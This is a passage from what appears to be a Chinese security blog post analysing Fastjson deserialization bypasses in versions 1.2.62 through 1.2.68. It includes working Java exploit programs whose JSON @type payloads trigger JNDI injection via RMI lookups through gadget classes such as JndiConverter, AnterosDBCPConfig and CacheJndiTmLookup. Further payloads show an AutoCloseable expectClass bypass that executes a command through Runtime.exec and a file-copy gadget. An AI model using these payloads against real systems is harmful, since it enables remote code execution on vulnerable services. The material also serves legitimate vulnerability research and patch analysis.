   <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span>    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span>        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ul>
<h2 id="漏洞触发的原理"><a href="#漏洞触发的原理" class="headerlink" title="漏洞触发的原理"></a>漏洞触发的原理</h2><p>漏洞产生的利用点是org.apache.xbean.propertyeditor.JndiConverter这个类，我们来看一下这个类具体的逻辑<br><img src="/posts/ab4b97db/20260130133419111.png" alt="image.png"><br>很明显这里有一个jndi的注入点，但是问题是这个方法不是setter&#x2F;getter方法，那么为什么这个点能被利用呢？还记得我们在进行fastjson反序列化的时候，除了setter和getter方法会被调用外，还会调用构造方法。<br><img src="/posts/ab4b97db/20260130134050757.png" alt="image.png"><br>我们可以看到这个构造方法调用了super函数，所以他是可以调用到父类的方法的，这里我们就可以跟过去，去看父类的方法到底有什么可以被调用的点<br><img src="/posts/ab4b97db/20260130134343288.png" alt="image.png"><br>看这里，首先明确一个点，它是setAsText方法（setter方法）这里调用了toObject方法。<br><img src="/posts/ab4b97db/20260130134819850.png" alt="image.png"><br>然后我们会看到toObjectImpl，跟进去看一下<img src="/posts/ab4b97db/20260130134921030.png" alt="image.png"></p>
<p>这里是一个抽象方法，会被子类实现，这也是我们想要的</p>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line"><span class="keyword">import</span> org.apache.xbean.propertyeditor.JndiConverter;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp1</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.xbean.propertyeditor.JndiConverter\&quot;,\&quot;AsText\&quot;:\&quot;rmi://localhost:1099/RO\&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(json);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/ab4b97db/20260130140433976.png" alt="image.png"></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p><img src="/posts/ab4b97db/20260130140940175.png" alt="image.png"><br>这里我们还是从checkAutoType开始看<br><img src="/posts/ab4b97db/20260130141227716.png" alt="image.png"><br>这里AutoType为true的逻辑，先进行白名单的匹配，在进行黑名单的检测，由于该类是没有在黑命单中的所以继续向下执行<br><img src="/posts/ab4b97db/20260130141806100.png" alt="image.png"><br>进行类的加载<br>然后就不分析了。<br>在新版本这个类就被添加了黑名单</p>
<h1 id="1-2-66"><a href="#1-2-66" class="headerlink" title="1.2.66"></a>1.2.66</h1><h2 id="环境及条件"><a href="#环境及条件" class="headerlink" title="环境及条件"></a>环境及条件</h2><ul>
<li>开启AutoType</li>
<li>Fastjson &lt;&#x3D; 1.2.66</li>
<li>JNDI注入利用所受的JDK版本限制；</li>
<li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core包；</li>
</ul>
<ul>
<li>br.com.anteros.dbcp.AnterosDBCPConfig 类需要 Anteros-Core和 Anteros-DBCP 包；</li>
<li>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类需要ibatis-sqlmap和jta包；</li>
</ul>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol>
<li><p>org.apache.shiro.realm.jndi.JndiRealmFactory类exp：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.realm.jndi.JndiRealmFactory\&quot;, \&quot;jndiNames\&quot;:[\&quot;rmi://localhost:1099/RO\&quot;], \&quot;Realms\&quot;:[\&quot;\&quot;]&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(json);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/ab4b97db/20260130143817194.png" alt="image.png"></p>
</li>
<li><p>br.com.anteros.dbcp.AnterosDBCPConfig类exp：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;metricRegistry\&quot;:\&quot;rmi://localhost:1099/RO\&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(json);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>或</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;br.com.anteros.dbcp.AnterosDBCPConfig\&quot;,\&quot;healthCheckRegistry\&quot;:\&quot;rmi://localhost:1099/RO\&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(json);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/ab4b97db/20260130144236266.png" alt="image.png"></p>
</li>
<li><p>com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig类exp：</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.ibatis.sqlmap.engine.transaction.jta.JtaTransactionConfig\&quot;,&quot;</span> +  </span><br><span class="line">               <span class="string">&quot;\&quot;properties\&quot;: &#123;\&quot;@type\&quot;:\&quot;java.util.Properties\&quot;,\&quot;UserTransaction\&quot;:\&quot;rmi://localhost:1099/RO\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(json);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="/posts/ab4b97db/20260130144425656.png" alt="image.png"></p>
</li>
</ol>
<h1 id="1-2-67"><a href="#1-2-67" class="headerlink" title="1.2.67"></a>1.2.67</h1><h2 id="环境及条件-1"><a href="#环境及条件-1" class="headerlink" title="环境及条件"></a>环境及条件</h2><ul>
<li>开启AutoType；</li>
<li>Fastjson &lt;&#x3D; 1.2.67；</li>
<li>JNDI注入利用所受的JDK版本限制；</li>
<li>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类需要ignite-core、ignite-jta和jta依赖；</li>
<li>org.apache.shiro.jndi.JndiObjectFactory类需要shiro-core和slf4j-api依赖；</li>
</ul>
<h2 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><ol>
<li>org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup类exp<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ignite.cache.jta.jndi.CacheJndiTmLookup\&quot;, \&quot;jndiNames\&quot;:[\&quot;rmi://localhost:1099/RO\&quot;], \&quot;tm\&quot;: &#123;\&quot;$ref\&quot;:\&quot;$.tm\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(json);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/posts/ab4b97db/20260130150512950.png" alt="image.png"></li>
<li>org.apache.shiro.jndi.JndiObjectFactory类exp：<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.parser.ParserConfig;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp2</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        ParserConfig.getGlobalInstance().setAutoTypeSupport(<span class="literal">true</span>);  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.shiro.jndi.JndiObjectFactory\&quot;,\&quot;resourceName\&quot;:\&quot;rmi://localhost:1099/RO\&quot;,\&quot;instance\&quot;:&#123;\&quot;$ref\&quot;:\&quot;$.instance\&quot;&#125;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(json);  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<img src="/posts/ab4b97db/20260130150712109.png" alt="image.png"></li>
</ol>
<h1 id="1-2-68"><a href="#1-2-68" class="headerlink" title="1.2.68"></a>1.2.68</h1><p>使用expectClass绕过AutoType</p>
<h2 id="条件"><a href="#条件" class="headerlink" title="条件"></a>条件</h2><ul>
<li>Fastjson &lt;&#x3D; 1.2.68；</li>
<li>利用类必须是expectClass类的子类或实现类，并且不在黑名单中；</li>
</ul>
<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>本次绕过主要的点是在checkAutoType函数的第二个参数expectClass，通过传入一个类作为expectClass参数，在传入一个这个类的子类或者是实现类来实现对checkAutoType的绕过，最终执行恶意代码。<br>但是这个子类或者是实现类的构造方法，或getter&#x2F;setter方法必须得进行危险操作才可以哈。</p>
<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>AutoCloseable作为expectClass参数，然后在写一个执行恶意方法的类来模拟一下<br>记得要实现AutoCloseable<br>VulAutoCloseable</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">VulAutoCloseable</span> <span class="keyword">implements</span> <span class="title class_">AutoCloseable</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">VulAutoCloseable</span><span class="params">(String cmd)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        Runtime.getRuntime().exec(cmd);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">exp3</span> &#123;  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;  </span><br><span class="line">        <span class="type">String</span> <span class="variable">json</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;java.lang.AutoCloseable\&quot;,\&quot;@type\&quot;:\&quot;VulAutoCloseable\&quot;,\&quot;cmd\&quot;:\&quot;calc\&quot;&#125;&quot;</span>;  </span><br><span class="line">        JSON.parseObject(json);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>发现命令是可以执行的<br><img src="/posts/ab4b97db/20260130175646926.png" alt="image.png"></p>
<h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p><img src="/posts/ab4b97db/20260130175804836.png" alt="image.png"><br>还是从checkAutoType这里开始分析，第一次的expectClass是null<br><img src="/posts/ab4b97db/20260130180127411.png" alt="image.png"><br>因为autoType是没有开启的所以这边直接过了<br><img src="/posts/ab4b97db/20260130180327193.png" alt="image.png"><br>这里从map中获取类，然后进行判断，主要判断clazz是否为null，有没有白名单，然后判断目标类是不是expectClass类的子类或者实现类并且不能是hashmap类型，因为expectClass在这里的判断中为null，所以直接就return了。<br>然后就出来了，接着向下走，一直到获取反序列化器的位置<br><img src="/posts/ab4b97db/20260130180919743.png" alt="image.png"><br>在这里进行反序列化，我们来跟进看一下逻辑<br><img src="/posts/ab4b97db/20260130181016104.png" alt="image.png"><br>首先我们能看到现在的type是AutoCloseable，继续向下调试<br><img src="/posts/ab4b97db/20260130181259291.png" alt="image.png"><br>我们会发现又会进入到checkAutoType方法，但是这一次的expectClass参数不为空，它是我们第一次传入的AutoCloseable，现在目标类变成了VulAutoCloseable<br><img src="/posts/ab4b97db/20260130181607090.png" alt="image.png"><br>由于存在了expectClass类这里的expectClassFlag为true<br><img src="/posts/ab4b97db/20260130182051710.png" alt="image.png"><br>又因为这里的expectClassFlag是true所以会进入到autoType的开启逻辑里，当然没有白名单，目标类也不在黑名单中，所以就直接出来了。<br><img src="/posts/ab4b97db/20260130182336127.png" alt="image.png"><br>接着又进入到autoType的关闭逻辑里，一样是直接就出来了。<br><img src="/posts/ab4b97db/20260130182632058.png" alt="image.png"><br>还是因为expectClassFlag这里为true，所以会进入到类的加载里，但是cacheClass（缓存的）这个参数是false<br><img src="/posts/ab4b97db/20260130182951013.png" alt="image.png"><br>这里对类进行加载之后返回clazz。<br><img src="/posts/ab4b97db/20260130183152610.png" alt="image.png"><br>这里对jsonType做了个判断，如果是true的话就会添加到mapping的缓存中，否则就会继续判断是否是ClassLoader、DataSource、RowSet等类的子类，如果是的话就直接抛出错误，这里主要防的是jndi的攻击方法。继续向下。<br><img src="/posts/ab4b97db/20260130195541312.png" alt="image.png"><br>这里是判断目标类是不是expectClass类的子类，或者是实现类，也是为什么我们的恶意类是AutoCloseable接口的实现类的原因。<br><img src="/posts/ab4b97db/20260130200051965.png" alt="image.png"><br>最后触发执行</p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>第一个type作为expectClass参数，让第二个type，能够正常的加载之后被返回。<br>其实<code>&quot;@type&quot;:&quot;java.lang.AutoCloseable&quot;</code>也就相当于@type，这样应该就能清晰一点。<br>注意点：恶意类一定 要是第一个type的子类或者是实现类。</p>
<h2 id="漏洞利用-2"><a href="#漏洞利用-2" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>这里是写入文件<br>IntputStream和OutputStream都是实现自AutoCloseable接口的</p>
<h3 id="条件-1"><a href="#条件-1" class="headerlink" title="条件"></a>条件</h3><ol>
<li>OutputStream类的set或者是构造方法要能够指向一个路径</li>
<li>OutputStream类的set或者是构造方法能够传入字节数据，并且传入的数据类型，是byte[]、ByteBuffer、String、char[]其中的一个，还可以通过其中一个set或者是构造方法能调用write，将数据写入。</li>
<li>OutputStream类的set或者是构造方法要能够调用toString，hashcode，set，get，构造方法，这些方法要能调用OutputStream类的close，flush，write方法。</li>
</ol>
<h3 id="复制文件"><a href="#复制文件" class="headerlink" title="复制文件"></a>复制文件</h3><p>这里使用的是：<strong>org.eclipse.core.internal.localstore.SafeFileOutputStream</strong><br>依赖包</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.aspectj<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>aspectjtools<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span>  </span><br><span class="line"> <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.9.5<span class="tag">&lt;/<span class="name">version</span>&gt;</span>  </span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>源码</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//  </span></span><br><span class="line"><span class="comment">// Source code recreated from a .class file by IntelliJ IDEA  </span></span><br><span class="line"><span class="comment">// (powered by FernFlower decompiler)  </span></span><br><span class="line"><span class="comment">//  </span></span><br><span class="line">  </span><br><span class="line"><span class="keyword">package</span> org.eclipse.core.internal.localstore;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.io.BufferedInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.BufferedOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.File;  </span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.IOException;  </span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;  </span><br><span class="line"><span class="keyword">import</span> java.io.OutputStream;  </span><br><span class="line"><span class="keyword">import</span> org.eclipse.core.internal.utils.FileUtil;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">SafeFileOutputStream</span> <span class="keyword">extends</span> <span class="title class_">OutputStream</span> &#123;  </span><br><span class="line">    <span class="keyword">protected</span> File temp;  </span><br><span class="line">    <span class="keyword">protected</span> File target;  </span><br><span class="line">    <span class="keyword">protected</span> OutputStream output;  </span><br><span class="line">    <span class="keyword">protected</span> <span class="type">boolean</span> failed;  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">EXTENSION</span> <span class="operator">=</span> <span class="string">&quot;.bak&quot;</span>;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SafeFileOutputStream</span><span class="params">(File file)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="built_in">this</span>(file.getAbsolutePath(), (String)<span class="literal">null</span>);  </span><br><span class="line">    &#125;  </span><br><span class="line">  <span class="comment">//主要就是当target文件不存在且temp文件存在时，能够将temp文件的内容复制到target文件中</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">SafeFileOutputStream</span><span class="params">(String targetPath, String tempPath)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="built_in">this</span>.failed = <span class="literal">false</span>;  </span><br><span class="line">        <span class="built_in">this</span>.target = <span class="keyword">new</span> <span class="title class_">File</span>(targetPath);  </span><br><span class="line">        <span class="built_in">this</span>.createTempFile(tempPath);  </span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.target.exists()) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.temp.exists()) &#123;  </span><br><span class="line">                <span class="built_in">this</span>.output = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="built_in">this</span>.target));  </span><br><span class="line">                <span class="keyword">return</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            <span class="built_in">this</span>.copy(<span class="built_in">this</span>.temp, <span class="built_in">this</span>.target);  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="built_in">this</span>.output = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="built_in">this</span>.temp));  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">close</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.output.close();  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;  </span><br><span class="line">            <span class="keyword">throw</span> e;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.failed) &#123;  </span><br><span class="line">            <span class="built_in">this</span>.temp.delete();  </span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.commit();  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">commit</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.temp.exists()) &#123;  </span><br><span class="line">            <span class="built_in">this</span>.target.delete();  </span><br><span class="line">            <span class="built_in">this</span>.copy(<span class="built_in">this</span>.temp, <span class="built_in">this</span>.target);  </span><br><span class="line">            <span class="built_in">this</span>.temp.delete();  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">copy</span><span class="params">(File sourceFile, File destinationFile)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="keyword">if</span> (sourceFile.exists()) &#123;  </span><br><span class="line">            <span class="keyword">if</span> (!sourceFile.renameTo(destinationFile)) &#123;  </span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">source</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">                <span class="type">OutputStream</span> <span class="variable">destination</span> <span class="operator">=</span> <span class="literal">null</span>;  </span><br><span class="line">  </span><br><span class="line">                <span class="keyword">try</span> &#123;  </span><br><span class="line">                    source = <span class="keyword">new</span> <span class="title class_">BufferedInputStream</span>(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(sourceFile));  </span><br><span class="line">                    destination = <span class="keyword">new</span> <span class="title class_">BufferedOutputStream</span>(<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(destinationFile));  </span><br><span class="line">                    <span class="built_in">this</span>.transferStreams(source, destination);  </span><br><span class="line">                    destination.close();  </span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;  </span><br><span class="line">                    FileUtil.safeClose(source);  </span><br><span class="line">                    FileUtil.safeClose(destination);  </span><br><span class="line">                &#125;  </span><br><span class="line">  </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">createTempFile</span><span class="params">(String tempPath)</span> &#123;  </span><br><span class="line">        <span class="keyword">if</span> (tempPath == <span class="literal">null</span>) &#123;  </span><br><span class="line">            tempPath = <span class="built_in">this</span>.target.getAbsolutePath() + <span class="string">&quot;.bak&quot;</span>;  </span><br><span class="line">        &#125;  </span><br><span class="line">  </span><br><span class="line">        <span class="built_in">this</span>.temp = <span class="keyword">new</span> <span class="title class_">File</span>(tempPath);  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">flush</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.output.flush();  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;  </span><br><span class="line">            <span class="keyword">throw</span> e;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getTempFilePath</span><span class="params">()</span> &#123;  </span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.temp.getAbsolutePath();  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">transferStreams</span><span class="params">(InputStream source, OutputStream destination)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="type">byte</span>[] buffer = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">8192</span>];  </span><br><span class="line">  </span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;  </span><br><span class="line">            <span class="type">int</span> <span class="variable">bytesRead</span> <span class="operator">=</span> source.read(buffer);  </span><br><span class="line">            <span class="keyword">if</span> (bytesRead == -<span class="number">1</span>) &#123;  </span><br><span class="line">                <span class="keyword">return</span>;  </span><br><span class="line">            &#125;  </span><br><span class="line">  </span><br><span class="line">            destination.write(buffer, <span class="number">0</span>, bytesRead);  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">  </span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">write</span><span class="params">(<span class="type">int</span> b)</span> <span class="keyword">throws</span> IOException &#123;  </span><br><span class="line">        <span class="keyword">try</span> &#123;  </span><br><span class="line">            <span class="built_in">this</span>.output.write(b);  </span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;  </span><br><span class="line">            <span class="built_in">this</span>.failed = <span class="literal">true</span>;  </span><br><span class="line">            <span class="keyword">throw</span> e;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>exp</p>
